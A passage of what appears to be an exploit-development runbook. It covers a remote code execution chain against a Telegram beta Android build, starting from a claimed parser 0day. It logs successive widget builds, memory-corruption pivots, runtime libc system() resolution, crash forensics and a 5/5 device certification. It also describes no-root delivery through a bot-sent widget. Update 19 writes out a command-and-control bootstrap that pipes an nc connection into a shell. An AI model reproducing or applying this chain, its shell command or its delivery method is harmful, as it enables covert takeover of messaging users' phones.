# RUNBOOK: parser-0day widget chain (Telegram beta 72889, Sony XQ-BT52)

Host-only package. The orchestrator owns every device operation (install,
open, pull, logcat). This runbook defines the exact artifacts and the expected
markers. Two packages exist:

* **§A; universal blind final (0day-only): `univ_final_72889.html` /
  `univ_debug_72889.html`.** No Frida, no calibration, no per-device unknown
  constants. This is the package to ship via <BOT_USERNAME> inline (or a normal
  message / DB deploy as a fallback).
* **§B; `device_calibrated_intermediate` (diagnostic only):**
  `parser_{trigger,calib,final,debug}_72889.html`. Requires the one-time
  `chain_off` calibration and must not be shipped as the final.

The entrypoint of both is the parser 0day (`ARG_SCOPE_END` / `OP_eval` u16
scope-index leak). **0day-only label: entrypoint = parser 0day; n-day stages =
none.** No #1827/#1865 stage and no n-day-specific code path is present.

---

## 0a-novemdecies. UPDATE 19: C2 delivery widget on the universal c2560s final (72929)

New artifact: `device/widget/c2560_final_c2560s_c2_72929.html`
= **9,946 raw / 4,025 zlib9**, A/B/C = 2,228/7,182/408,
md5 `5f4fdaed215ed09b261920186a39e3eb`.

* Stage A and stage C are byte-identical to the device-proven
  `c2560_final_c2560s_72929.html`; stage B differs only in the 50-byte
  `system()` command literal, which now holds the 44-char C2 bootstrap
  `setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&` plus 6 trailing spaces.
  The stage-B script length is unchanged at 7,182, so the 72929 probe
  `S1 SAFE2560C` at B=7,182 (19:20) still applies; **no new probe needed**.
* Builder: `device/gen_c2_widget.py` (asserts A/C identical, B=7,182, literal
  width 50, `sh -n`, raw/zlib limits).  Host twin:
  `device/widget/c2560_final_c2560s_c2_host.html` (same A/C, exact 44-char
  literal, B=7,182; the device endgame is expected to stop at
  `HF ERR NOANCHOR` on the host).
* Host proof: `c2/run_widget_e2e.sh` 11/11 (stage A forge, `HF OK`, teardown
  `system(bootstrap)`, loader 39,784 B, mock hello/exec/bye) and
  `c2/run_local_test.sh` 91/91 (phase 7: exact 44-char form, <=50 bytes,
  PATH applets, `system()` returns in <2 s, busybox applet-symlink proxy).
* Device procedure (orchestrator-owned): `c2/README.md` §5.0.1; loopback
  server on 4444/5555, `adb reverse` both ports, DB row 80345 via
  `lab/qjs_n1/db/build_db.py`, open `tg://openmessage?user_id=<CHAT_ID>&
  message_id=80345`.  Expected `hello uid=10346 user=u0_a346
  device=XQ-BT52 from=127.0.0.1`, `exec id` -> `untrusted_app`.

---

## 0a-octodecies. SUPERSEDING UPDATE 18: c2560s final under the size limit, ready

The app `.rela.plt` loop was the real blocker, not the libc scan: `setF(ajmp)`
outside the loop was clobbered by the in-loop `setF(asym+si*24)`; entry 1 read
`.dynsym` bytes as `r_info` (`si=1920103539`). Fixed per-entry:
`setF(ajmp+eo); ro=r64F(0); ri=r64F(8)`. The libc `system` is now a bounded
`.gnu.hash` lookup (DT_HASH nchain or `(strtab-symtab)/24` sym_count; nb/so/
bsz/bsh bounds; bloom; buckets/chain; `st_name+7<=strsz`; name check). Host
proof 162; VDOM `S1 ABLEN[599]=327744 VLEN=327744 END=HF OK`.

The final is rebuilt at the probe-SAFE **B=7,182** (not 7,694):
`c2560_final_c2560s_72929.html` = **9,946 raw / 4,023 zlib9** (<=4,050, under
4,096). Host final 9,946 / 4,014, proof 162. CAND fallback is debug-only.

Next run 72929: **`c2560_final_c2560s_72929.html`** (blind
`/tmp/opencode/tgbot/widget.html`); probe SAFE already at B=7,182; expected
proof 185 (`uid=10346…`) and app alive.

---

## 0a-septendecies. SUPERSEDING UPDATE 17: c2560s debug device-proven: final resolver blocker

72929 (13.2.2): c2560s probe SAFE (`S1 SAFE2560C`), debug READY:

```
S1 ABLEN[599]=327744 VLEN=327744 END=HF READY VNC=1 VO=1360 X=0 XG=0 G=0 GS=115 V=1 VK=2 VG=5 P=4944
```

B=6,917 holds. VK=2 = class-20 JSArrayBuffer struct not found in V page 0; the
page-derived class-24 fallback found P=4944 at runtime. No fixed 0x7000/0x37000
window; the V anchor is universal and device-proven.

The universal final is NOT host-proven. `JS_DEF_FREE`/`FREE_GOT` are removed;
the app base, `.rela.plt` free JUMP_SLOT and libc `system` are runtime. The
app `.rela.plt` absolute-address bug (`r64F(ajmp+o*24)`) and the `d_ptr` rule
(`v>=app ? v : app+v`) are fixed. The host final no longer segfaults but does
not write the proof and the marker yields no VDOM: the B does not complete.
The 30,000-entry linear libc `.dynsym` scan is the prime suspect (the GNU hash
was removed for size); the class-24 V2 far is otherwise proven by the debug.

Host matrix on both libs: `.rela.plt` free JUMP_SLOT = 0x1971ef0 (72889) /
0x1971fd0 (72929), resolved at runtime; `system` is not imported by
libtmessages; the libc path is required; `d_ptr` absolute/virtual rule applies
to a PIE whose dynamic values are absolute (host qjs) or virtual (Android).

Next: restore a bounded GNU-hash lookup for `system` (bloom/buckets/chain with
`nb/bsz/so` bounds and `bk < lsym_count`), re-test the host final to proof 162,
then 72929 to proof 185 with the same B. Do not ship the final before the host
proof. If B grows, re-run the probe SAFE.

---

## 0a-sexdecies. SUPERSEDING UPDATE 16: 72929 lib shift + class-24 self-pivot (c2560r)

Device 13.2.2 (72929): safe probe c2560q PASS (`S1 SAFE2560C END=-`, app
alive) -> stage A/forged AB/class 2560/cpool 110/AB 2544 and A/B/C
(2,228/5,356/408) are still valid. c2560q debug CRASH: tombstone 17,
PC 0x17239d8 (Uint8Array read), SEGV_ACCERR, fault 0x6c56c00002,
x9=0x6c56bc8ae8, offset 0x3751a (226,586), page PROT_NONE. The faulting
scan is the **class-64 T-AB pivot** (the B's first full-V scan), not the
class-24 scan: the pivot loop `for(o=0;o+24<327744;o+=8)` reads V[o+2] at
o=226,584; the class-24 scan never ran. The offset matches the 72889
c2560o full-V fault because the same V page gap appears.

Lib 72929 vs 72889 (sha256 f217... vs f12c...; BuildId f0a1... vs
21ec...): size +224 B; .data.rel.ro/.got.plt/.data +0xE0, .bss +0xC0;
the typed-array element read at 0x17239d8 is **byte-identical**
(data ptr +0x38, count +0x40), so the JSObject/u.array layout is
unchanged. The free/realloc wrappers shifted +0x108 (new free@plt branch
at 0x174b378): JS_DEF_FREE = **0x174b374** (old 0x174b26c); free@LIBC
JUMP_SLOT GOT = **0x1971fd0** (old 0x1971ef0). The QuickJS engine/struct
layouts are unchanged; the app heap layout changed, so the class-64 T-AB
struct is no longer inside the safe V pages.

r design (no class-64 pivot, no full-V scan):
- class-24 scan only V[0,0x37000): the 72929 c2560q pivot read 0..0x36fff
  and faulted at page 55, so this window is the 72929-proven mapped range
  (the 72889 c2560n 0x7000 window is not the current device). O24 in the
  marker reports the class-24 offset.
- the class-24 V view is its own far primitive: V2 = new Uint8Array(VAB)
  controls it; writing V's u.ptr (+56) through V2 re-points V at any
  address. V2 stays at VBase for V data.
- block header VBase-8 -> arena (page base) -> slab -> base/used via
  rd32 low/high + tag strip; slab list next/prev; PG[81] used bits; every
  V data read gated. Absolute probe uses the far view for shape -> proto ->
  prop -> C_FUNCTION -> realm -> rt -> malloc_limit -> pie; CAND fallback
  from the used slab pages.
- safe NOANCHOR if the class-24 is absent (VK=0,VG=0,O24=-1) or the guard
  fails; no unguarded V read beyond 0x37000.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560r_72929.html` | 8,120 | 2,605 |
| `c2560_final_c2560r_72929.html` | 8,120 | 3,118 |
| `c4096_debug_c4096r_72929.html` | 8,395 | 2,607 |
| `c4096_final_c4096r_72929.html` | 8,395 | 3,120 |
| `c2560_probe_c2560r_72929.html` | 8,120 | 950 |
| `c4096_probe_c4096r_72929.html` | 8,395 | 956 |

A/B/C: c2560 A=2,228; c4096 A=2,503; B=5,356 device / 5,340 host; C=408.
Host: c2560r debug `HF READY VNC=1 VO=2440 X=0 XG=0 G=0 GS=47 V=1 VK=1
VG=5 O24=4232`; c4096r `GS=43 O24=3336`; finals proof 162; probes SAFE.

Device expected: `S1 ABLEN[599]=327744 VLEN=327744 END=HF READY
VNC=<n> VO=1360 X=<step> XG=<step> G=0 GS=<slabs> V=1 VK=1 VG=5
O24=<offset>` or `HF ERR NOANCHOR ... VK=.. VG=.. O24=..`.
VG: 0 no class-24, 2 arena mismatch, 3 slab ptr, 4 used bit/self-check,
5 guard OK. Do not run the final until READY; then proof
`/data/user/0/org.telegram.messenger.beta/files/n1` (CMD writes
`/data/data/org.telegram.messenger.beta/files/n1`).

Blind path `/tmp/opencode/tgbot/widget.html` =
**`c2560_debug_c2560r_72929.html`**.

---

## 0a-quindecies. SUPERSEDING UPDATE 15: device certification 5/5 (2026-11-07)

The q path is certified hook-free on the Sony (build 72889).

Debug `c2560_debug_c2560q_72889.html` (3,004 zlib9), app alive:

```
S1 ABLEN[599]=327744 VLEN=327744 END=HF READY VNC=1 VO=1360 X=0 XG=0 G=0 GS=115 V=1 VK=1 VG=5
```

Final `c2560_final_c2560q_72889.html` (8,120 raw / 3,289 zlib9), 5/5 runs,
each with a fresh DB, force-stop, `n1` deletion and message open:

- `n1` 185 B in all 5, md5 `52258bc776f2f378542d1b2c736840e3`;
- content `uid=10346(u0_a346) ... context=u:r:untrusted_app:s0:c90,c257,c512,c768`;
- app alive after the battery (pid 28001); logcat 17:57-18:01 has 0
  `Fatal signal` / `SIGSEGV`;
- no per-device calibration; VBase/page/slab/rt are runtime.

Follow-up with Frida off: the N1 `frida-server` was stopped and the
`magisk-frida` module disabled; clean **5/5** (`clean_nofrida/`, runs
18:04:58-18:11:24) reproduced the same 185-B md5 with `TracerPid=0`,
`CapEff=0`, no `su`/`frida` process. A **no-root bot delivery**
(`noroot_bot/`, beta `sendWidget` mid 16679) also wrote the same proof
without adb/root delivery. Audit:
`device/logs/device_parser_rce/AUDIT_no_root_cheat.md`.

Certification: `device/logs/device_parser_rce/CERTIFICATION_5of5.md`
(`proof_run1..5.txt`, `debug_ready_run1.png`). Use the final as the shipped
artifact; the debug is diagnostics only. The c4096q fallback is host-only
so far (proof 162), not device-tested.

The parser proof is the `id` line only (no `MEGARCE`): the 50-byte command
is bounded by the 64-byte forged AB data block.

---

## 0a-quattuordecies. SUPERSEDING UPDATE 14: V-anchor q (class-24 VBase + used-page guard)

Device c2560p: `S1 ABLEN[599]=327744 VLEN=327744 END=HF ERR NOBASE VNC=25
VO=1360`, app alive. Page 0 holds 25 class-20 candidates, first at 1360.

Host layout findings that changed the design:
- the real VBase is the **class-24 Uint8Array view object**: class_id 24 at
  +18, `u.array.count` 327744 at +64, `u.array.u.ptr` at +56 (host offset
  V+4232); the class-20 +16 fields are not data pointers;
- the block arena is the **VBase page base**:
  `VBase-8-bidx*bs-48 == VBase&~0xfff` (bidx 23 host, bs 72); the old
  `use(VBase-0x100,0x200)` window missed it, so the old guard read zeros;
- every slab/base value must use `rd32` low/high with the high tag stripped
  (`a48`); V-relative pointers must use `p48` (the device pointers are
  tagged >2^53 and `g64`/`%` lose the low bits);
- the anchor probe must be **absolute** (ABX `focus`), not V-offset: the
  shape/proto/realm/rt objects are outside the forged V range (host first
  candidate X=1 in the old V-offset probe).

q design:
- class-24 scan over V[0,0x7000) (c2560n proved pages 0-6 readable, c2560o
  0-54; the scan stops before the c2560n page-7 fault);
- page window = the VBase page; arena -> slab -> base/used via `a48`;
  used-bit self-check for VBase; slab list next/prev; `PG[81]` = used bit
  per V page; **every V read** is gated by `PG`;
- page-0/used-page class-20 candidates are primary; `probeCtor` is absolute
  with `hok`+`inUsed` on every dereference:
  shape -> proto -> prop -> C_FUNCTION -> realm -> rt -> malloc_limit -> pie;
- debug keeps the endG5 D2/CAND fallback (exact a48, used-bit self-check,
  `inUsed`); final keeps a minimal D2 used-bit NOBASE check (B-size limit)
  and the ELF/system resolver (linear `.dynsym` scan, GNU-hash parser
  removed for size).

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560q_72889.html` | 8,120 | 3,004 |
| `c2560_final_c2560q_72889.html` | 8,120 | 3,289 |
| `c4096_debug_c4096q_72889.html` | 8,395 | 3,007 |
| `c4096_final_c4096q_72889.html` | 8,395 | 3,291 |
| `c2560_probe_c2560q_72889.html` | 8,120 | 970 |
| `c4096_probe_c4096q_72889.html` | 8,395 | 977 |

A/B/C unchanged: c2560 A=2,228; c4096 A=2,503; B=5,356 device / 5,340
host; C=408. Host: c2560q debug `HF READY VNC=1 VO=2440 X=0 XG=0 G=0
GS=48 V=1 VK=1 VG=5`; c4096q debug `GS=43`; both finals proof 162; probes
`SAFE2560C`/`SAFE4096C`.

Device expected: `S1 ABLEN[599]=327744 VLEN=327744 END=HF READY VNC=<n>
VO=1360 X=<step> XG=<cand step> G=0 GS=<slabs> V=1 VK=1 VG=5` or a precise
`HF ERR NOANCHOR ... VK=.. VG=..` / `HF ERR NOBASE ...`. VG: 0 no class-24,
1 arena mismatch, 2 slab ptr, 3 used bit/self-check, 4 PG[0], 5 guard OK.
Do not run the final until the debug shows `HF READY`; then the proof
`/data/user/0/org.telegram.messenger.beta/files/n1` (CMD writes
`/data/data/org.telegram.messenger.beta/files/n1`).

Blind path `/tmp/opencode/tgbot/widget.html` =
**`c2560_debug_c2560q_72889.html`**.

---

## 0a-terdecies. SUPERSEDING UPDATE 13: page-limited V count (c2560p)

c2560o (tombstone 16) is the **stage-C full V scan**: PC `0x17239d8`
(Uint8Array element read), x1=`0x6c39771e38` (typed array), x9=`0x6c39770ae8`
(data), x2=`0x3751a` (226,586), fault `0x6c397a8002` = x9+x2; page
`0x6c397a8000` PROT_NONE. c2560n faulted at V offset 29,978 (page 7), and
c2560o at 226,586 (page 55): the V mapping is only partly committed and
varies per run, so c2560m's full scan was luck. Page 0 (the forged
AB/class-20 candidates, VO=1360/2408) was mapped in every run.

c2560p: the stage-C V count reads only `V[0,4096)` - page 0, the forged AB
data block's own live page. On the device `NOBASE` path no other V read
happens: B (endG5, unchanged) returns at `NOBASE` before its own full-V
anchor scan. This is a safe-counts gate, not the V anchor; do not call it
safe until the Sony survives.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560p_72889.html` | 8,120 | 3,341 |
| `c2560_final_c2560p_72889.html` (endG5 full) | 8,120 | 3,341 |
| `c2560_probe_c2560p_72889.html` | 8,120 | 1,051 |
| `c4096_debug_c4096p_72889.html` | 8,395 | 3,341 |
| `c4096_final_c4096p_72889.html` | 8,395 | 3,340 |
| `c4096_probe_c4096p_72889.html` | 8,395 | 1,054 |

A/B/C: c2560 A=2,228; c4096 A=2,503; B=5,356 device / 5,340 host; C=408.
Host: c2560p debug `END=HF OK VNC=15 VO=2408`; final proof 162; probe
`S1 SAFE2560C END=- VNC=0 VO=-1`. c4096p debug `END=HF OK VNC=6 VO=2440`;
probe `S1 SAFE4096C`. Blind path `/tmp/opencode/tgbot/widget.html` =
**`c2560_debug_c2560p_72889.html`**.

Device expected: `S1 ABLEN[599]=327744 VLEN=327744 END=HF ERR NOBASE
VNC=<page-0 count> VO=<first offset>` (or `HF OK` only if the slab base
passes), app alive. Then the V-anchor retry with the `VBase-8 -> arena ->
JSArenaSlab used` page guard on **every** V read (anchor scan + count), and
the final/proof `/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 0a-duodecies. SUPERSEDING UPDATE 12: VBase fix + V page gate (c2560o)

c2560n crashed because VBase came from the **first** class-20 327744 match
(false data pointer). c2560o fixes VBase recovery:
1. the actual **Uint8Array view object** (JS_CLASS_UINT8_ARRAY=24,
   `u.array.count`=327744 at +64, `u.array.u.ptr` at +56); or
2. the VAB/T[599] class-20 struct (`byte_length`=327744, data at +16).
Then read the class-64 header at `VBase-8` -> arena -> `JSArenaSlab`; the
`used` 16-page bitmap must have the VBase page set. The V-primary path runs
only if that page is committed; otherwise the endG5 slab NOANCHOR fallback
is used. The crash `0x6c5f0bd002` (V element read at page 0x6c5f0bd000,
PROT_NONE) cannot recur.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560o_72889.html` | 8,120 | 3,120 |
| `c2560_final_c2560o_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096o_72889.html` | 8,395 | 3,121 |
| `c4096_final_c4096o_72889.html` | 8,395 | 3,311 |

A/B/C unchanged (2,228/2,503, 5,356/5,340, 408). Host: c2560o debug
`END=HF READY VNC=1273 VO=2440 X=1 XG=-1 G=4096 GS=24 SV=`; c4096o
`VNC=1193`; final proof 162; probes survive. Blind path
`/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560o_72889.html**.
Next device run: c2560o debug; expected `END=HF READY VNC=..VO=.. X=..
VK=.. VPg=..` or a safe `NOANCHOR` with `VPOK=..`; app alive. The V-anchor
final is built only after a device READY; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 0a-undecies. SUPERSEDING UPDATE 11: V page fault: safe counts-only c2560o


c2560n (V-primary) crashed: SEGV_ACCERR `0x6c5f0bd002`. PC `0x17239d8` is a
Uint8Array element read: x1=0x6c5f0b6e38 (typed array), x9=0x6c5f0b5ae8
(data pointer), w2=0x751a (29978); fault = x9+w2, page `0x6c5f0bd000`
PROT_NONE. The V data pointer/len are valid, but the V data mapping is not
fully committed; `vin` checked only the offset range, not the V page/slab
`used` bitmap. The c2560m stage-C V scan was safe because its V data pages
were mapped.

Safe rule: after VBase, read the class-64 block header at VBase-8 -> arena
-> `JSArenaSlab`; use the `used` 16-page bitmap (and the slab ranges) to
limit V reads to committed pages; if the target/candidate page is not used,
fall back to the endG5 slab NOANCHOR state. Until then, the counts-only
c2560o/c4096o debug (c2560m behaviour: endG5 B + stage-C VNC/VO) is the safe
gate; no V-anchor final until READY on device.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560o_72889.html` | 8,120 | 3,349 |
| `c2560_final_c2560o_72889.html` (endG5 full) | 8,120 | 3,349 |
| `c4096_debug_c4096o_72889.html` | 8,395 | 3,350 |
| `c4096_final_c4096o_72889.html` | 8,395 | 3,349 |

A/B/C unchanged (2,228/2,503, 5,356/5,340, 408). Blind path
`/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560o_72889.html**.
Next device run: c2560o debug; expected `S1 ABLEN[599]=327744 VLEN=327744
END=HF ERR NOANCHOR SV= VNC=..VO=..`, app alive. Then the V page/slab-used
guard and the V-anchor retry; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 0a-decies. SUPERSEDING UPDATE 10: V-primary anchor debug (endG8d)


Device c2560m: `END=HF ERR NOBASE SV=NOBASE H=21 D=7 BS=72 ... VNC=1181
VO=1360`; the V count is independent and the slab/base path failed.
endG8d makes the **V candidates the primary anchor path**: VBase from the
forged AB struct (`byte_length=327744`), all candidate fields read through
the V offsets (`o+... < 327744`, `vin` guard), no `focus`/re-point; the
slab/CAND path is only a fallback. It returns `HF READY`/`HF ERR NOANCHOR`
with `VNC VO X XG G GS` and any `SLABV`.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560n_72889.html` | 8,120 | 2,937 |
| `c2560_final_c2560n_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096n_72889.html` | 8,395 | 2,937 |
| `c4096_final_c4096n_72889.html` | 8,395 | 3,311 |

A/B/C: 2,228/2,503, 5,356/5,340, 408. Host: c2560n debug `END=HF READY
VNC=1273 VO=2440 X=1 XG=-1 G=4096 GS=24 SV=`; c4096n `READY VNC=1193
VO=2440 X=1`; final proof 162; probes survive. The V path found the anchor
on the host through the V offsets; the first candidate's shape was outside
V (X=1), a later one resolved.

Slab/base: the c2560m values `SLAB=0xb400006d2e88…`, `SBASE=…` are tagged
>2^53; `%4096` on the JS double is unreliable (true low 0x5898, double
0x5800). The correct slab validation is `rd32` low/high, page from the low
32, tag/range; the endG5 slab success path remains for the fallback.

Blind path `/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560n_72889.html**.
Next device run: c2560n debug; expected `S1 ABLEN[599]=327744 VLEN=327744
END=HF READY VNC=..VO=.. X=.. ...` or `END=HF ERR NOANCHOR ...`, app alive.
Then the V-anchor final + ELF; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 0a-nonies. SUPERSEDING UPDATE 9: stage-C V count with the safe endG5 B


c2560l (endG7l) was safe but NOBASE before the counts:
`SV=NOBASE H=21 D=7 BS=72 SLAB=12970367395759182000 SBASE=12970367397101263000`.
The endG7l B changed the pivot/slab path; endG5 (c2560h) had slab success
(`SV=`).

**c2560m/c4096m**: keep the **c2560h endG5 B unchanged** (slab-success
path) and add a **stage-C V count**: no endgame `focus`/re-point. The
C scans the 327744-byte `V` for class-20 (`V[o+18]|V[o+19]<<8` == 20) and
prints `S1 <mark> END=<MEGA> SV=<SLABV> VNC=<n>VO=<first offset>`. C=408,
A/B unchanged (c2560 A=2,228, c4096 A=2,503, B=5,356/5,340).

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560m_72889.html` | 8,120 | 3,349 |
| `c2560_final_c2560m_72889.html` (endG5 full) | 8,120 | 3,349 |
| `c4096_debug_c4096m_72889.html` | 8,395 | 3,350 |
| `c4096_final_c4096m_72889.html` | 8,395 | 3,349 |

Host: c2560m debug `END=HF OK SV= VNC=1274VO=2408`; c4096m `VNC=1193VO=2440`;
final proof 162; probe `VNC=0VO=-1`. The C count is safe even when the
endgame stops at NOANCHOR/NOBASE.

NOBASE value analysis: `SLAB=0xb400006d2e88d0b0`,
`SBASE=0xb400006d7e875898`; tags `0xb400`; the true SBASE low 48 =
`0x6d7e875898` (`%4096=2200`), the JS `rd64` double rounds it to
`…0x5800` (`%4096=2048`). The `slab+16` field is not a page-aligned base for
that pivot (class-72 T[599] data block, H=21 D=7 BS=72), and the tagged
>2^53 pointer cannot be validated with `%4096` on a JS double. The fix is
to read the low/high 32 bits (`rd32`), take the page from the low 32, and
check the tag/range; the c2560m avoids the endG7l pivot path by using the
proven endG5 B.

Blind path `/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560m_72889.html**.
Next device run: c2560m debug; expected `S1 ABLEN[599]=327744 VLEN=327744
END=HF ERR NOANCHOR SV= VNC=..VO=..`, app alive. Then the mapped/slab guard
(candidate `focus` only inside validated ranges) and the anchor retry; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 0a-octies. SUPERSEDING UPDATE 8: counts-only anchor diagnostic (endG7l)


c2560k (endG6k) crashed SEGV_MAPERR `0x15e2000000020000`: the `probeCtor`
`focus` on a candidate field outside mapped memory. Tag/alignment is not
enough. c2560h endG5 stayed safe with `END=HF ERR NOANCHOR SV=`.

`device/endG7l.js` is the **counts-only** debug: same endG5 pivot/slab/CAND
scan, no `probeCtor`, no `X`/shape/proto dereference. It reports:
`NC` (forward forged-view class-20 count), `G` (CAND length), `GS` (slab
count), `C` (first three CAND offsets relative to D2), `O` (first three V
offsets); returns `HF ERR NOANCHOR ...` and the app stays alive.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560l_72889.html` | 8,120 | 2,299 |
| `c2560_final_c2560l_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096l_72889.html` | 8,395 | 2,301 |
| `c4096_final_c4096l_72889.html` | 8,395 | 3,311 |

A/B/C: c2560 A=2,228, c4096 A=2,503, B=5,356 (device)/5,340 (host), C=408.
Host counts: c2560l `NC=1273 G=4096 GS=24
C=-64896,-64784,-64672 O=2440,2552,2664`; c4096l `NC=1193 G=4096 GS=22
C=3088,3200,3312 O=2440,2552,2664`. The candidates exist; the device crash
was the dereference, not the scan. Final 5/5 proof 162; probes survive.

Blind path `/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560l_72889.html**.
Next device run: the counts-only c2560l; expected `END=HF ERR NOANCHOR
NC=.. G=.. GS=.. C=.. O=.. SV=`, app alive. After the counts, add the
mapped/slab-membership guard before any `focus` (CAND/V objects and
shape/proto/pay in `inSlab`/the known ranges; realm/rt only in validated
ranges) and retry the anchor. No Frida/per-device.

---

## 0a-septies. SUPERSEDING UPDATE 7: safe anchor diagnostics (endG6k)


The c2560j debug (endG6d, backward `use(D2-0x8000,0x8000+327744)`) crashed:
SIGSEGV SEGV_MAPERR, fault `0x51000000020000`. The backward view re-pointed
to unmapped memory before the AB data; the c2560h endG5 (no backward scan)
was safe with `END=HF ERR NOANCHOR SV=`.

`device/endG6k.js` is the safe anchor-only debug: **no backward scan**, no
new `use()` on unvalidated memory. It keeps endG5's pivot/slab/CAND/
probeCtor and `hok` tag guard and reports only:
`NC` (forward forged-view class-20 count), `G` (CAND length), `GS` (slab
count), `X`/`XG` (first V / first CAND failure step; 0 hok, 1 shape,
2 proto, 3 prop, 4 pay, 5 C_FUNCTION, 6 code, 7 realm, 8 rt/LIM, 9 pie),
`O` (first three V offsets). Debug returns `HF READY ...` or
`HF ERR NOANCHOR ...` with the fields; no ELF; the app stays alive.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560k_72889.html` | 8,120 | 2,706 |
| `c2560_final_c2560k_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096k_72889.html` | 8,395 | 2,707 |
| `c4096_final_c4096k_72889.html` | 8,395 | 3,311 |

A/B/C unchanged: c2560 A=2,228, c4096 A=2,503, B=5,356 (device)/5,340
(host), C=408. Host: c2560k debug `END=HF READY NC=0 G=4096 GS=24 X=-1 XG=-1
O=-1,-1,-1 SV=`; c4096k `GS=22`; final 5/5 proof 162; probes survive. The
CAND path finds the anchor on the host; the forward view has no class-20
struct.

Blind path `/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560k_72889.html**.
Next device run: the c2560k debug; expected `END=HF READY/ERR NOANCHOR
NC=.. G=.. GS=.. X=.. XG=.. O=..` with the failing `XG` step, app alive.
Then the anchor fix (shape/proto/prop/C_FUNCTION/realm/rt/LIM) and the
final; proof `/data/user/0/org.telegram.messenger.beta/files/n1`.
No Frida/per-device.

---

## 0a-sexies. SUPERSEDING UPDATE 6: NOANCHOR anchor diagnostics (endG6d)


Device c2560h debug: `S1 ABLEN[599]=327744 VLEN=327744 END=HF ERR NOANCHOR
SV=`; app alive. `SV=` empty = the slab path completed; the class-20 anchor
(`shape->proto->prop->C_FUNCTION->realm->rt->malloc_limit`) failed.

`device/endG6d.js` is the anchor-only debug: same pivot/slab/CAND/probeCtor
and `hok` tag guard, plus:
* `NC/G/GS` = class-20 candidates in the forged view (forward+backward) /
  CAND length / slab count;
* `X`/`XG` = first V candidate failure step / first CAND failure step
  (0 hok, 1 shape, 2 proto, 3 prop, 4 pay, 5 ctor, 6 code, 7 realm, 8 rt/LIM,
  9 pie);
* `O` = first three V candidate offsets;
* backward scan `use(D2-0x8000, 0x8000+327744)` so the T[599] struct below the
  data base is also visible; the debug returns `HF READY ...` or
  `HF ERR NOANCHOR ...` with the fields (no ELF).

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560j_72889.html` | 8,120 | 2,806 |
| `c2560_final_c2560j_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096j_72889.html` | 8,395 | 2,806 |
| `c4096_final_c4096j_72889.html` | 8,395 | 3,311 |

A/B/C unchanged: c2560 A=2,228, c4096 A=2,503, B=5,356 (device)/5,340
(host), C=408. Host: c2560j/c4096j debug `END=HF READY NC=0 G=4096 GS=24/22
X=-1 XG=-1 O=-1,-1,-1 SV=`; final 5/5 proof 162; probes survive. The CAND
path finds the anchor on the host; the V scan finds no class-20 struct
(NC=0), confirming the T[599] struct is outside the positive window.

Blind path `/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560j_72889.html**.
Next device run: the c2560j debug; expected `END=HF READY NC=.. G=.. GS=..
X=.. XG=.. O=..` or `END=HF ERR NOANCHOR NC=.. G=.. GS=.. X=.. XG=.. O=..`
with the failing step. The final after the anchor fix; the current
`c2560_final_c2560j` is the endG5 full (same anchor path).
No Frida/per-device.

---

## 0a-quinquies. SUPERSEDING UPDATE 5: safe NOBASE debug (endG5)


Device c2560g debug crashed at `0x17239d8` (false Uint8Array window;
`x9=0xf95b00000001c000`, tag 0xf9) from the endG4 forged-pivot/direct path;
the c2560g safe probe passed (`S1 SAFE2560C END=- SV=-`), so the +399 B
stage A is fine. The endG3 non-fatal NOBASE path (c2560d) was safe but had
no slab values.

**endG5** (`device/endG5.js`): (1) revert to the original class-64 T-AB pivot
(no forged-pivot/direct regression); (2) BADBS/NOSLAB/NOBASE set
`globalThis.SLABV` and `globalThis.MEGA` and **return** (no direct fallback,
no crash); NOBASE carries `H=<bidx> D=<sidx> BS=<bs> SLAB=<ptr>
SBASE=<ptr>`; (3) window validation `hok(x)` requires the candidate pointer
tag == the pivot `D2` tag and the untagged address >65,536/8-aligned, applied
to obj/shape/proto/pay/realm/rt and the slab walk; this rejects the f9/0
wild pointers before any Uint8Array read. The debug C prints
`S1 <mark> END=<MEGA> SV=<SLABV>`.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560h_72889.html` | 8,120 | 3,310 |
| `c2560_final_c2560h_72889.html` | 8,120 | 3,310 |
| `c2560_probe_c2560h_72889.html` | 8,120 | 991 |
| `c4096_debug_c4096h_72889.html` | 8,395 | 3,311 |
| `c4096_final_c4096h_72889.html` | 8,395 | 3,311 |

A/B/C: c2560 A=2,228, c4096 A=2,503, **B=5,356 (device) / 5,340 (host)**,
C=408; the B length is exactly the c2560g safe-probe length that passed on
the Sony; only the endgame content changed. Host: c2560h/c4096h final 5/5
proof 162, debug 5/5 `END=HF OK SV=`, probes 5/5 survive.

Blind path `/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560h_72889.html**.
Next device run: the c2560 debug; expected
`S1 ABLEN[599]=327744 VLEN=327744 END=HF OK SV=` or a precise
`END=HF ERR NOBASE SV=NOBASE H=.. D=.. BS=.. SLAB=.. SBASE=..` with the app
